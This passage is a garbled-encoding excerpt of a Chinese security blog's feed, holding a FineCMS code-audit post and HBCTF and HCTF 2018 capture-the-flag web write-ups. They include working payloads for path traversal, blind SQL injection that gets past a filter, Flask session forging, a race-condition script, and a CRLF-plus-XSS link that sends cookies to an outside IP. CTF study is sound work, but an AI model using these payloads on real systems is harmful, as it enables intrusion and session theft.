        $auth = $this-&gt;input-&gt;get(&#39;auth&#39;, true);
        if ($auth != md5(SYS_KEY)) &#123;
            // æˆæƒè®¤è¯ç ä¸æ­£ç¡®
            $data = array(&#39;msg&#39; =&gt; &#39;æˆæƒè®¤è¯ç ä¸æ­£ç¡®&#39;, &#39;code&#39; =&gt; 0);
        &#125; else &#123;
            // è§£ææ•°æ®
            $cache = &#39;&#39;;
            $param = $this-&gt;input-&gt;get(&#39;param&#39;);
            if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;
                $cache = md5(dr_array2string($param));
                $data = $this-&gt;get_cache_data($cache);
            &#125;
            if (!$data) &#123;

                // listæ•°æ®æŸ¥è¯¢
                $data = $this-&gt;template-&gt;list_tag($param);
                $data[&#39;code&#39;] = $data[&#39;error&#39;] ? 0 : 1;
                unset($data[&#39;sql&#39;], $data[&#39;pages&#39;]);

                // ç¼“å­˜æ•°æ®
                $cache &amp;&amp; $this-&gt;set_cache_data($cache, $data, $param[&#39;cache&#39;]);
            &#125;
        &#125;

        // æ¥æ”¶å‚æ•°
        $format = $this-&gt;input-&gt;get(&#39;format&#39;);
        $function = $this-&gt;input-&gt;get(&#39;function&#39;);
        if ($function) &#123;
            if (!function_exists($function)) &#123;
                $data = array(&#39;msg&#39; =&gt; fc_lang(&#39;è‡ªå®šä¹‰å‡½æ•°&#39;.$function.&#39;ä¸å­˜åœ¨&#39;), &#39;code&#39; =&gt; 0);
            &#125; else &#123;
                $data = $function($data);
            &#125;
        &#125;

        // é¡µé¢è¾“å‡º
        if ($format == &#39;php&#39;) &#123;
            print_r($data);
        &#125; elseif ($format == &#39;jsonp&#39;) &#123;
            // è‡ªå®šä¹‰è¿”å›åç§°
            echo $this-&gt;input-&gt;get(&#39;callback&#39;, TRUE).&#39;(&#39;.$this-&gt;callback_json($data).&#39;)&#39;;
        &#125; else &#123;
            // è‡ªå®šä¹‰è¿”å›åç§°
            echo $this-&gt;callback_json($data);
        &#125;
        exit;
    &#125;</code></pre>
<p>å¯ä»¥çœ‹åˆ°å¼€å§‹æœ‰ä¸ªå®‰å…¨ç çš„éªŒè¯ï¼Œæœ‰äº†ä¹‹å‰å¾—åˆ°çš„å®‰å…¨ç ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°äº†.</p>
<p><code>if ($auth != md5(SYS_KEY)) &#123;</code>å°†authå€¼ä¸SYS_KEYçš„md5å€¼è¿›è¡Œæ¯”å¯¹ï¼ŒåŒåˆ™ç»§ç»­ï¼Œå¼‚åˆ™å¤±è´¥ã€‚</p>
<p><code> $param = $this-&gt;input-&gt;get(&#39;param&#39;);</code>è·å¾—è¾“å…¥paramå‚æ•°å€¼ã€‚</p>
<p><code>$data = $this-&gt;template-&gt;list_tag($param);</code>é€ æˆäº†æ¼æ´ã€‚</p>
<p>å®šä½list_tag()å‡½æ•°çœ‹çœ‹ã€‚</p>
<p><code>/finecms/dayrui/libraries/Template.php</code>ç¬¬402-1314æ˜¯list_tagå‡½æ•°ã€‚</p>
<p>ä¸€éƒ¨åˆ†ä»£ç ã€‚</p>
<pre><code class="php">      switch ($system[&#39;action&#39;]) &#123;
            Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
              Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
                  Â·Â·Â·Â·Â·Â·Â·Â·Â·
        case &#39;sql&#39;: // ç›´æ¥sqlæŸ¥è¯¢

                if (preg_match(&#39;/sql=\&#39;(.+)\&#39;/sU&#39;, $_params, $sql)) &#123;


                    // æ•°æ®æºçš„é€‰æ‹©
                    $db = $this-&gt;ci-&gt;db;

                    // æ›¿æ¢å‰ç¼€
                    $sql = str_replace(
                        array(&#39;@#S&#39;, &#39;@#&#39;),
                        array($db-&gt;dbprefix.$system[&#39;site&#39;], $db-&gt;dbprefix),
                        trim(urldecode($sql[1]))
                    );
                    if (stripos($sql, &#39;SELECT&#39;) !== 0) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &#39;SQLè¯­å¥åªèƒ½æ˜¯SELECTæŸ¥è¯¢è¯­å¥&#39;);
                    &#125;

                    $total = 0;
                    $pages = &#39;&#39;;

                    // å¦‚å­˜åœ¨åˆ†é¡µæ¡ä»¶æ‰è¿›è¡Œåˆ†é¡µæŸ¥è¯¢
                    if ($system[&#39;page&#39;] &amp;&amp; $system[&#39;urlrule&#39;]) &#123;
                        $page = max(1, (int)$_GET[&#39;page&#39;]);
                        $row = $this-&gt;_query(preg_replace(&#39;/select \* from/iUs&#39;, &#39;SELECT count(*) as c FROM&#39;, $sql), $system[&#39;site&#39;], $system[&#39;cache&#39;], FALSE);
                        $total = (int)$row[&#39;c&#39;];
                        $pagesize = $system[&#39;pagesize&#39;] ? $system[&#39;pagesize&#39;] : 10;
                        // æ²¡æœ‰æ•°æ®æ—¶è¿”å›ç©º
                        if (!$total) &#123;
                            return $this-&gt;_return($system[&#39;return&#39;], &#39;æ²¡æœ‰æŸ¥è¯¢åˆ°å†…å®¹&#39;, $sql, 0);
                        &#125;
                        $sql.= &#39; LIMIT &#39;.$pagesize * ($page - 1).&#39;,&#39;.$pagesize;
                        $pages = $this-&gt;_get_pagination(str_replace(&#39;[page]&#39;, &#39;&#123;page&#125;&#39;, urldecode($system[&#39;urlrule&#39;])), $pagesize, $total);
                    &#125;

                    $data = $this-&gt;_query($sql, $system[&#39;site&#39;], $system[&#39;cache&#39;]);
                    $fields = NULL;

                    if ($system[&#39;module&#39;]) &#123;
                        $fields = $this-&gt;ci-&gt;module[$system[&#39;module&#39;]][&#39;field&#39;]; // æ¨¡å‹ä¸»è¡¨çš„å­—æ®µ
                    &#125;

                    if ($fields) &#123;
                        // ç¼“å­˜æŸ¥è¯¢ç»“æœ
                        $name = &#39;list-action-sql-&#39;.md5($sql);
                        $cache = $this-&gt;ci-&gt;get_cache_data($name);
                        if (!$cache &amp;&amp; is_array($data)) &#123;
                            // æ¨¡å‹è¡¨çš„ç³»ç»Ÿå­—æ®µ
                            $fields[&#39;inputtime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            $fields[&#39;updatetime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            // æ ¼å¼åŒ–æ˜¾ç¤ºè‡ªå®šä¹‰å­—æ®µå†…å®¹
                            foreach ($data as $i =&gt; $t) &#123;
                                $data[$i] = $this-&gt;ci-&gt;field_format_value($fields, $t, 1);
                            &#125;
                            //$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]);
                            $cache = $system[&#39;cache&#39;] ? $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]) : $data;
                        &#125;
                        $data = $cache;
                    &#125;
                    return $this-&gt;_return($system[&#39;return&#39;], $data, $sql, $total, $pages, $pagesize);
                &#125; else &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;å‚æ•°ä¸æ­£ç¡®ï¼ŒSQLè¯­å¥å¿…é¡»ç”¨å•å¼•å·åŒ…èµ·æ¥&#39;); // æ²¡æœ‰æŸ¥è¯¢åˆ°å†…å®¹
                &#125;
                break;

            case &#39;table&#39;: // è¡¨åæŸ¥è¯¢

                if (!$system[&#39;table&#39;]) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;tableå‚æ•°ä¸å­˜åœ¨&#39;);
                &#125;

                // é»˜è®¤ç«™ç‚¹å‚æ•°
                $system[&#39;site&#39;] = !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;];

                $tableinfo = $this-&gt;ci-&gt;get_cache(&#39;table&#39;);
                if (!$tableinfo) &#123;
                    $this-&gt;ci-&gt;load-&gt;model(&#39;system_model&#39;);
                    $tableinfo = $this-&gt;ci-&gt;system_model-&gt;cache(); // è¡¨ç»“æ„ç¼“å­˜
                &#125;
                if (!$tableinfo) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;è¡¨ç»“æ„ç¼“å­˜ä¸å­˜åœ¨ï¼ˆåå°èœå•-æ›´æ–°è¡¨ç»“æ„ï¼‰&#39;); // æ²¡æœ‰è¡¨ç»“æ„ç¼“å­˜æ—¶è¿”å›ç©º
                &#125;

                $table = $this-&gt;ci-&gt;db-&gt;dbprefix($system[&#39;table&#39;]); // ä¸»è¡¨
                if (!isset($tableinfo[$table][&#39;field&#39;])) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;è¡¨ï¼ˆ&#39;.$table.&#39;ï¼‰ç»“æ„ç¼“å­˜ä¸å­˜åœ¨ï¼ˆåå°èœå•-æ›´æ–°è¡¨ç»“æ„ï¼‰&#39;);
                &#125;

                $where = $this-&gt;_set_where_field_prefix($where, $tableinfo[$table][&#39;field&#39;], $table); // ç»™æ¡ä»¶å­—æ®µåŠ ä¸Šè¡¨å‰ç¼€
                $system[&#39;field&#39;] = $this-&gt;_set_select_field_prefix($system[&#39;field&#39;], $tableinfo[$table][&#39;field&#39;], $table); // ç»™æ˜¾ç¤ºå­—æ®µåŠ ä¸Šè¡¨å‰ç¼€
                $system[&#39;order&#39;] = $this-&gt;_set_order_field_prefix($system[&#39;order&#39;], $tableinfo[$table][&#39;field&#39;], $table); // ç»™æ’åºå­—æ®µåŠ ä¸Šè¡¨å‰ç¼€

                $total = 0;
                $sql_from = $table; // sqlçš„fromå­å¥</code></pre>
<p>å°±å¯ä»¥æ‰§è¡Œsqlè¯­å¥äº†ã€‚</p>
<p>POC:</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/183650354.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/212038658.png" alt="mark"></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>HBCTFçš„WriteUp</title>
    <url>/2017/04/23/hbctf-de-writeup/</url>
    <content><![CDATA[<h1 id="HBCTFçš„WriteUp"><a href="#HBCTFçš„WriteUp" class="headerlink" title="HBCTFçš„WriteUp"></a>HBCTFçš„WriteUp</h1><p>1.åŒ…ç½—ä¸‡è±¡</p>
<p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œå›¾ç‰‡éšå†™ï¼Œæ”¹åç¼€ä¸ºzipï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªflag.txt,æ‰“å¼€å‘ç°è¿™ä¸ªflagä¸å¯¹åŠ²ï¼Œå¥½åƒåªæœ‰ä¸€åŠï¼Œæ—¢ç„¶è¯´äº†åŒ…ç½—ä¸‡è±¡é‚£å°±ä¸åªä¸€ç§æ–¹æ³•ï¼Œæ”¾stegsolveé‡Œå·¦å³ç¿»ä¸€ä¸‹å‘ç°å¦ä¸€åŠflagã€‚</p>
<p>2.çŸ¥å·±çŸ¥å½¼</p>
<p>ä¸‹è½½ä¸‹æ¥å‹ç¼©åŒ…é‡Œæœ‰ä¸ªæ–‡ä»¶BurpLoader.jar,è¿™ä¸ªå°ä¸œè¥¿ï¼Œå¥½ç†Ÿæ‚‰ï¼Œæ˜æ–‡æ”»å‡»å•Šã€‚è¿˜æç¤ºäº†ç”¨çš„å¥½å‹ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170423/214337450.png" alt="mark"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF-Webçš„éƒ¨åˆ†WP</title>
    <url>/2018/11/12/hctf-web-de-bu-fen-wp/</url>
    <content><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>æºç </p>
<pre><code class="php">&lt;?php
    class emmm
    &#123;
        public static function checkFile(&amp;$page)
        &#123;
            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
            if (! isset($page) || !is_string($page)) &#123;
                echo &quot;you can&#39;t see it&quot;;
                return false;
            &#125;

            if (in_array($page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;
            echo &quot;you can&#39;t see it&quot;;
            return false;
        &#125;
    &#125;

    if (! empty($_REQUEST[&#39;file&#39;])
        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
    ) &#123;
        include $_REQUEST[&#39;file&#39;];
        exit;
    &#125; else &#123;
        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
    &#125;  
?&gt;</code></pre>
<p>å’Œphpadminçš„<a href="http://seaii-blog.com/index.php/2018/07/03/84.html">CVE-2018-12613</a>åˆ©ç”¨ç‚¹ä¸€æ ·ï¼Œåˆ©ç”¨<code>ï¼Ÿ</code>çš„åŒé‡urlencodeæ¥ç»•è¿‡ã€‚</p>
<p>payloadï¼š</p>
<pre><code>http://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../../ffffllllaaaagggg</code></pre>
<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><blockquote>
<p>æè¿°</p>
<p>A script kidâ€™s phishing website</p>
</blockquote>
<p><a href="http://www.zipæœ‰æºç æ³„æ¼,åœ¨member.phpä¸­å­˜åœ¨æ³¨å…¥./">www.zipæœ‰æºç æ³„æ¼ï¼Œåœ¨member.phpä¸­å­˜åœ¨æ³¨å…¥ã€‚</a></p>
<p>Member.php</p>
<pre><code class="php">&lt;?php
if (!defined(&#39;IN_CRONLITE&#39;)) exit();
$islogin = 0;
if (isset($_COOKIE[&quot;islogin&quot;])) &#123;
    if ($_COOKIE[&quot;login_data&quot;]) &#123;
        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
        $admin_user = $login_data[&#39;admin_user&#39;];
        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
        if ($udata[&#39;username&#39;] == &#39;&#39;) &#123;
            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
        &#125;
        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
        if ($admin_pass == $login_data[&#39;admin_pass&#39;]) &#123;
            $islogin = 1;
        &#125; else &#123;
            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
        &#125;
    &#125;
&#125;
if (isset($_SESSION[&#39;islogin&#39;])) &#123;
    if ($_SESSION[&quot;admin_user&quot;]) &#123;
        $admin_user = base64_decode($_SESSION[&#39;admin_user&#39;]);
        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
        if ($admin_pass == $_SESSION[&quot;admin_pass&quot;]) &#123;
            $islogin = 1;
        &#125;
    &#125;
&#125;
?&gt;</code></pre>
<p>Safe.php</p>
<pre><code class="php">&lt;?php
function waf($string)
&#123;
    $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;
    return preg_replace_callback($blacklist, function ($match) &#123;
        return &#39;@&#39; . $match[0] . &#39;@&#39;;
    &#125;, $string);
&#125;

function safe($string)
&#123;
    if (is_array($string)) &#123;
        foreach ($string as $key =&gt; $val) &#123;
            $string[$key] = safe($val);
        &#125;
    &#125; else &#123;
        $string = waf($string);
    &#125;
    return $string;
&#125;

foreach ($_GET as $key =&gt; $value) &#123;
    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
        $value = safe($value);
    &#125;
    $_GET[$key] = $value;
&#125;
foreach ($_POST as $key =&gt; $value) &#123;
    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
        $value = safe($value);
    &#125;
    $_POST[$key] = $value;
&#125;
foreach ($_COOKIE as $key =&gt; $value) &#123;
    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
        $value = safe($value);
    &#125;
    $_COOKIE[$key] = $value;
&#125;
unset($cplen, $key, $value);
?&gt;</code></pre>
<p>cookieæ³¨å…¥ï¼Œunicodeç¼–ç è¿‡wafã€‚</p>
<p>payloadï¼š</p>
<pre><code>admin&#39; and (if(ascii(substr(database(),1,1))&gt;10,sleep(3),1))#
â¬‡ï¸
\u0061\u0064\u006d\u0069\u006e\u0027\u0020\u0061\u006e\u0064\u0020\u0028\u0069\u0066\u0028\u0061\u0073\u0063\u0069\u0069\u0028\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u002c\u0031\u002c\u0031\u0029\u0029\u003e\u0031\u0030\u002c\u0073\u006c\u0065\u0065\u0070\u0028\u0033\u0029\u002c\u0031\u0029\u0029\u0023</code></pre>
<p>å†™è„šæœ¬ç›²æ³¨å°±okã€‚</p>
<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><blockquote>
<p>æè¿°</p>
<p>only admin can get it update1/æ›´æ–°1: 1. fix bugs 2. attention: you may need to restart all your work as something has changed hint: 1. docker 2. only few things running on it update2/æ›´æ–°2: Sorryï¼Œthere are still some bugs, so down temporarily. update3/æ›´æ–°3: fixed bug</p>
</blockquote>
<p>è½¯è¿æ¥è¯»æºç +seasonä¼ªé€ </p>
<p>è¯»<code>/proc/self/environ</code>å¾—åˆ°uwsgié…ç½®æ–‡ä»¶ã€‚</p>
<pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
SUPERVISOR_GROUP_NAME=uwsgi
HOSTNAME=323a960bcc1a
SHLVL=0
PYTHON_PIP_VERSION=18.1
HOME=/root
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
NGINX_MAX_UPLOAD=0
UWSGI_PROCESSES=16
STATIC_URL=/static
UWSGI_CHEAPER=2
NGINX_VERSION=1.13.12-1~stretch
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NJS_VERSION=1.13.12.0.2.0-1~stretch
LANG=C.UTF-8
SUPERVISOR_ENABLED=1
PYTHON_VERSION=3.6.6
NGINX_WORKER_PROCESSES=auto
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=uwsgi
LISTEN_PORT=80STATIC_INDEX=0
PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
STATIC_PATH=/app/static
PYTHONPATH=/app
UWSGI_RELOADS=</code></pre>
<p>å†å»è¯»<code>UWSGI_INI</code></p>
<pre><code>[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</code></pre>
<p>å»è¯»æ–‡ä»¶<code>app/hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main.py </code></p>
<p>å¾—åˆ°æºç ï¼š</p>
<pre><code class="python"># -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)
app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;
app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 * 1024
ALLOWED_EXTENSIONS = set([&#39;zip&#39;])

def allowed_file(filename):
    return &#39;.&#39; in filename and \
           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
def index():
    error = request.args.get(&#39;error&#39;, &#39;&#39;)
    if(error == &#39;1&#39;):
        session.pop(&#39;username&#39;, None)
        return render_template(&#39;index.html&#39;, forbidden=1)

    if &#39;username&#39; in session:
        return render_template(&#39;index.html&#39;, user=session[&#39;username&#39;], flag=flag.flag)
    else:
        return render_template(&#39;index.html&#39;)


@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
def login():
    username=request.form[&#39;username&#39;]

    password=request.form[&#39;password&#39;]
    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:
        if(username == &#39;admin&#39;):
            return redirect(url_for(&#39;index&#39;,error=1))
        session[&#39;username&#39;] = username
    return redirect(url_for(&#39;index&#39;))


@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])
def logout():
    session.pop(&#39;username&#39;, None)
    return redirect(url_for(&#39;index&#39;))

@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
def upload_file():
    if &#39;the_file&#39; not in request.files:
        return redirect(url_for(&#39;index&#39;))
    file = request.files[&#39;the_file&#39;]
    if file.filename == &#39;&#39;:
        return redirect(url_for(&#39;index&#39;))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)
        if(os.path.exists(file_save_path)):
            return &#39;This file already exists&#39;
        file.save(file_save_path)
    else:
        return &#39;This file is not a zipfile&#39;


    try:
        extract_path = file_save_path + &#39;_&#39;
        os.system(&#39;unzip -n &#39; + file_save_path + &#39; -d &#39;+ extract_path)
        read_obj = os.popen(&#39;cat &#39; + extract_path + &#39;/*&#39;)
        file = read_obj.read()
        read_obj.close()
      os.system(&#39;rm -rf &#39; + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):
            return redirect(url_for(&#39;index&#39;, error=1))
    return Response(file)


if __name__ == &#39;__main__&#39;:
    #app.run(debug=True)
    app.run(host=&#39;127.0.0.1&#39;, debug=True, port=10008)</code></pre>
<p>çŸ¥é“äº†ä»–security_keyçš„ç”Ÿæˆæ–¹å¼ï¼š<code>app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)</code></p>
<p><code>random.seed(uuid.getnode())</code>ï¼Œç§å­æ˜¯<code>uuid.getnode()</code>ï¼ŒæœåŠ¡å™¨macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚</p>
<p>å»è¯»ä¸€ä¸‹macåœ°å€ï¼š<code>/sys/class/net/eyh0/address</code></p>
<p>çœ‹ä¸€ä¸‹åŸcookieçš„å†…å®¹ï¼š<code>&#123;&quot;username&quot;:&quot;aaa&quot;&#125;</code></p>
<p>èµ·ä¸ªflaskç”Ÿæˆä¸€ä¸‹adminçš„sessionå»æ›¿æ¢cookieå°±okäº†ã€‚</p>
<p>[è¦ç”¨python3]</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><h3 id="è§£æ³•ä¸€ï¼šåˆ©ç”¨unicodeç¼–ç "><a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨unicodeç¼–ç " class="headerlink" title="è§£æ³•ä¸€ï¼šåˆ©ç”¨unicodeç¼–ç "></a>è§£æ³•ä¸€ï¼šåˆ©ç”¨unicodeç¼–ç </h3><p><a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicodeå®‰å…¨</a></p>
<p><code>nodeprep.prepare</code>å‡½æ•°å¤„ç†ç”¨æˆ·åé€ æˆçš„é—®é¢˜</p>
<pre><code class="python">def strlower(username):
    username = nodeprep.prepare(username)
    return username</code></pre>
<p>æ³¨å†Œä¸€ä¸ª<code>á´¬dmin</code>ï¼Œå¤„ç†åå˜æˆ<code>Admin</code>ï¼Œæ›´æ”¹å¯†ç æ”¹çš„æ˜¯<code>admin</code>çš„å¯†ç ï¼Œç™»é™†å°±okäº†ã€‚</p>
<h3 id="è§£æ³•äºŒï¼šä¼ªé€ session"><a href="#è§£æ³•äºŒï¼šä¼ªé€ session" class="headerlink" title="è§£æ³•äºŒï¼šä¼ªé€ session"></a>è§£æ³•äºŒï¼šä¼ªé€ session</h3><p>githubèƒ½æœåˆ°æºç <a href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a></p>
<p>æœ‰security_keyï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ sessionäº†ï¼Œåˆ©ç”¨adminç™»é™†å°±okã€‚</p>
<pre><code class="python">class Config(object):
    SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;
    SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;
    SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre>
<h3 id="è§£æ³•ä¸‰ï¼šæ¡ä»¶ç«äº‰"><a href="#è§£æ³•ä¸‰ï¼šæ¡ä»¶ç«äº‰" class="headerlink" title="è§£æ³•ä¸‰ï¼šæ¡ä»¶ç«äº‰"></a>è§£æ³•ä¸‰ï¼šæ¡ä»¶ç«äº‰</h3><p>æ¥è‡ª<a href="https://xz.aliyun.com/t/3242#toc-14">Whitzardçš„wp</a></p>
<p>è„šæœ¬</p>
<pre><code class="python">import requests
import threading

def login(s, username, password):
    data = &#123;
        &#39;username&#39;: username,
        &#39;password&#39;: password,
        &#39;submit&#39;: &#39;&#39;
    &#125;
    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)

def logout(s):
    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)

def change(s, newpassword):
    data = &#123;
        &#39;newpassword&#39;:newpassword
    &#125;
    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)

def func1(s):
    login(s, &#39;ddd&#39;, &#39;ddd&#39;)
    change(s, &#39;qweqweabcabc&#39;)

def func2(s):
    logout(s)
    res = login(s, &#39;admin&#39;, &#39;qweqweabcabc&#39;)
    if &#39;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#39; in res.text:
        print(&#39;finish&#39;)

def main():
    for i in range(1000):
        print(i)
        s = requests.Session()
        t1 = threading.Thread(target=func1, args=(s,))
        t2 = threading.Thread(target=func2, args=(s,))
        t1.start()
        t2.start()

if __name__ == &quot;__main__&quot;:
    main()</code></pre>
<p>æºç é‡Œæ”¹å¯†ç çš„usernameç›´æ¥ä»sessionä¸­å–äº†ã€‚</p>
<pre><code class="python">def login():
    if current_user.is_authenticated:
        return redirect(url_for(&#39;index&#39;))

    form = LoginForm()
    if request.method == &#39;POST&#39;:
        name = strlower(form.username.data)
        session[&#39;name&#39;] = name        #è¿™
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash(&#39;Invalid username or password&#39;)
            return redirect(url_for(&#39;login&#39;))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for(&#39;index&#39;))
    return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)

@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for(&#39;login&#39;))
    form = NewpasswordForm()
    if request.method == &#39;POST&#39;:
        name = strlower(session[&#39;name&#39;])    #è¿™é‡Œé€ æˆäº†é—®é¢˜
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash(&#39;change successful&#39;)
        return redirect(url_for(&#39;index&#39;))
    return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre>
<h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><blockquote>
<p>Not hard, I believe you are the lucky one!</p>
</blockquote>
<p>crlf+xss</p>
<pre><code>https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html?tdsourcetag=s_pctim_aiomsg</code></pre>
<p>payloadï¼š</p>
<pre><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0AX-XSS-Protection:0%0A%0A%3Cscript%3Elocation.href=`http://39.107.83.129/xss/?a=`%2bdocument.cookie%3C/script%3E</code></pre>
<p>æ›¿æ¢å¼¹å›æ¥çš„cookieå°±OKäº†</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Nextæ·»åŠ Algoliaæœç´¢</title>
    <url>/2017/04/06/hexo-next-tian-jia-algolia-sou-suo/</url>
    <content><![CDATA[<h1 id="Hexo-Next-æ·»åŠ Algoliaæœç´¢"><a href="#Hexo-Next-æ·»åŠ Algoliaæœç´¢" class="headerlink" title="Hexo+Next æ·»åŠ Algoliaæœç´¢"></a>Hexo+Next æ·»åŠ Algoliaæœç´¢</h1><blockquote>
<blockquote>
